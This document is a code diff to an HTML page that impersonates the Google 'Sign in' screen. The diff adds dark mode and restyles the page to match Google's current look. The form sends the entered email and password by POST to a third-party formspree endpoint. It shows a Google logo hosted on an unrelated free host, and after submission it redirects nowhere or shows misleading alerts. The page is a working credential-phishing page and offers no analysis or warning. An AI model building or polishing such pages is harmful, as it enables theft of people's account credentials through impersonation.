@@ -1,4 +1,3 @@
-<!-- modify this form HTML and place wherever you want your form -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -21,6 +20,12 @@
             flex-direction: column;
             min-height: 100vh;
             padding: 20px;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+        
+        body.dark-mode {
+            background-color: #0e0e0e;
+            color: #e8eaed;
         }
         
         .header {
@@ -33,12 +38,12 @@
         .logo-container {
             display: flex;
             justify-content: center;
-            margin-bottom: 20px;
+            margin-bottom: 1px;
         }
         
         .logo {
-            width: 68px;
-            height: 68px;
+            width: 40px;
+            height: 40px;
         }
         
         .signin-container {
@@ -48,20 +53,32 @@
             padding: 48px 40px 36px;
             border: 1px solid #dadce0;
             border-radius: 8px;
+            background-color: #fff;
+            transition: background-color 0.3s ease, border-color 0.3s ease;
+        }
+        
+        body.dark-mode .signin-container {
+            background-color: #0e0e0e;
+            border-color: #5f6368;
         }
         
         h1 {
-            font-size: 24px;
+            font-size: 32px;
             font-weight: 400;
-            margin-bottom: 10px;
-            text-align: center;
+            margin-bottom: 30px;
+            text-align: left;
         }
         
         .subtitle {
             font-size: 16px;
             color: #202124;
             margin-bottom: 35px;
-            text-align: center;
+            text-align: left;
+            transition: color 0.3s ease;
+        }
+        
+        body.dark-mode .subtitle {
+            color: #e8eaed;
         }
         
         .input-container {
@@ -82,11 +99,24 @@
             border: 1px solid #dadce0;
             border-radius: 4px;
             outline: none;
-            transition: border 0.2s;
+            transition: border 0.2s, background-color 0.3s ease, color 0.3s ease;
+            background-color: #fff;
+            color: #202124;
+        }
+        
+        body.dark-mode input[type="text"], 
+        body.dark-mode input[type="password"] {
+            background-color: #0e0e0e;
+            color: #e8eaed;
+            border-color: #;
         }
         
         input[type="text"]:focus, input[type="password"]:focus {
             border: 2px solid #1a73e8;
+        }
+        
+        body.dark-mode input[type="text"]:focus, input[type="password"]:focus {
+            border: 2px solid #a8c7fa;
         }
         
         .error {
@@ -107,12 +137,16 @@
         }
         
         .forgot-email {
-            color: #1a73e8;
+            color: #0b57d0;
             font-size: 14px;
             font-weight: 500;
             text-decoration: none;
             display: block;
             margin-bottom: 40px;
+        }
+        
+        body.dark-mode .forgot-email {
+          color: #a8c7fa;
         }
         
         .forgot-email:hover {
@@ -124,11 +158,22 @@
             color: #5f6368;
             margin-bottom: 30px;
             line-height: 1.5;
+            transition: color 0.3s ease;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
+        }
+        
+        body.dark-mode .note {
+            color: #9aa0a6;
         }
         
         .note a {
-            color: #1a73e8;
+            color: #0b57d0;
             text-decoration: none;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
+        }
+        
+        body.dark-mode .note a {
+            color: #a8c7fa;
         }
         
         .note a:hover {
@@ -143,35 +188,43 @@
         }
         
         .create-account {
-            color: #1a73e8;
+            color: #0b57d0;
             font-weight: 500;
             text-decoration: none;
             font-size: 14px;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
         }
         
         .create-account:hover {
             text-decoration: underline;
         }
         
+        body.dark-mode .create-account {
+          color:#a8c7fa;
+        }
+        
         .button {
-            background-color: #1a73e8;
-            color: white;
+            background-color: #0b57d0;
+            color: #ffffff;
             border: none;
-            border-radius: 4px;
+            border-radius: 20px;
             padding: 10px 24px;
             font-size: 14px;
-            font-weight: 500;
+            font-weight: 600;
             cursor: pointer;
             transition: background-color 0.2s;
+            position: center;
+            float: right;
         }
+        
+        body.dark-mode .button {
+            background-color: #a8c7fa;
+            color: #062e6f;
+        }
+        
         
         .button:hover {
-            background-color: #1b66c9;
-        }
-        
-        .button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
+            background-color: #081c59;
         }
         
         .footer {
@@ -182,6 +235,11 @@
             align-items: center;
             font-size: 12px;
             color: #5f6368;
+            transition: color 0.3s ease;
+        }
+        
+        body.dark-mode .footer {
+            color: #9aa0a6;
         }
         
         .footer-links {
@@ -192,6 +250,11 @@
         .footer-links a {
             color: #5f6368;
             text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        body.dark-mode .footer-links a {
+            color: #9aa0a6;
         }
         
         .footer-links a:hover {
@@ -213,24 +276,26 @@
             .footer {
                 flex-direction: column;
                 gap: 10px;
+                text-align: center;
             }
-      
+            
+            .footer-links {
+                justify-content: center;
+            }
+        }
     </style>
 </head>
-
-  <form id="myForm" action="https://formspree.io/f/xvgwqngd" method="POST">
-    
-    <div class="header">
-        <div class="logo-container">
-            <img src="https://uploads.wuaze.com/images-removebg-preview.png" alt="Google" class="logo">
+<body>
+    <form id="myForm" action="https://formspree.io/f/xvgwqngd" method="POST">
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://uploads.wuaze.com/images-removebg-preview.png" alt="Google" class="logo">
+            </div>
         </div>
-    </div>
-    
-    <div class="signin-container">
-      
-        <form id="loginForm">
+        
+        <div class="signin-container">
             <h1>Sign in</h1>
-            <p class="subtitle">with your Google Account. This account will be available to other Google apps in the browser.</p>
+            <p class="subtitle">Use your Google Account.</p>
             
             <div id="success-message" class="success" style="display: none;"></div>
             <div id="error-message" class="error" style="display: none; margin-bottom: 20px;"></div>
@@ -241,85 +306,99 @@
                 <span id="email-error" class="error"></span>
             </div>
             
-            
             <div class="input-container">
-              
-            <label>Password <input type="password" name="password" value="" id="myInput" required> </label>
-            
-            
-            <br><br>
-            
-                <input type="checkbox" onclick="myFunction()"> Show Password
+                <label for="password" class="input-label">Password</label>
+                <input type="password" name="password" value="" id="myInput" required>
+                
+                <br><br>
+                
+                  <label class="input-label"><input type="checkbox" onclick="myFunction()">&nbsp;&nbsp;&nbsp;Show password</label>
 
-          <script>
-          function myFunction() {
-            var x = document.getElementById("myInput");
-            if (x.type === "password") {
-              x.type = "text";
-            } else {
-              x.type = "password";
-            }
-          }
-          </script>
-            
-            
+                <script>
+                    function myFunction() {
+                        var x = document.getElementById("myInput");
+                        if (x.type === "password") {
+                            x.type = "text";
+                        } else {
+                            x.type = "password";
+                        }
+                    }
+                </script>
             </div>
             
-            <a href="#" class="forgot-email">Forgot email?</a>
+            <div> <button type="submit" class="button" id="submitBtn">Next</button></div> <br>
             
-            <p class="note">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></p>
+            <div>
+                <a href="#" class="forgot-email">Forgot email?</a>
+
+                <p class="note">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></p>
+            </div>
             
             <div class="links-container">
-                
                 <a href="#" class="create-account">Create account</a>
-                
-                <button type="submit" class="button" id="submitBtn">Next</button>
-                
             </div>
-        </form>
-        
-                    <script>
-            document.getElementById('myForm').addEventListener('submit', function(e) {
-              e.preventDefault();
-              
-              const form = e.target;
-              const formData = new FormData(form);
-              
-              fetch(form.action, {
-                method: 'POST',
-                body: formData,
-                headers: {
-                  'Accept': 'application/json'
-                }
-              })
-              .then(response => {
-                if (response.ok) {
-                  // Redirect on success
-                  window.location.href = 'https://#';
-                } else {
-                  // Handle error
-                  alert('You should re-check your input correctly!.');
-                }
-              })
-              .catch(error => {
-                alert('Restart your phone browser.');
-              });
-            });
-            </script>
-                    
-        
-    </div>
-    
-    <div class="footer">
-        <div class="footer-links">
-            <div class="language">English (United States)</div>
-            <a href="#">Help</a>
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
         </div>
-    </div>
-                             
-  </form>
-  
-  
+        
+        <div class="footer">
+            <div class="footer-links">
+            <div class="language">English (United States)</div>
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+        
+        <script>
+            // Theme management - automatically use device preference
+            function initializeTheme() {
+                // Check if user has a preferred color scheme
+                if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                    document.body.classList.add('dark-mode');
+                } else {
+                    document.body.classList.remove('dark-mode');
+                }
+            }
+            
+            // Listen for system theme changes
+            if (window.matchMedia) {
+                window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+                    if (e.matches) {
+                        document.body.classList.add('dark-mode');
+                    } else {
+                        document.body.classList.remove('dark-mode');
+                    }
+                });
+            }
+            
+            // Initialize theme on page load
+            document.addEventListener('DOMContentLoaded', initializeTheme);
+            
+            // Form submission handler
+            document.getElementById('myForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const form = e.target;
+                const formData = new FormData(form);
+                
+                fetch(form.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = 'https://#';
+                    } else {
+                        alert('You should re-check your input correctly!.');
+                    }
+                })
+                .catch(error => {
+                    alert('Restart your phone browser.');
+                });
+            });
+        </script>
+    </form>
+</body>
 </html>
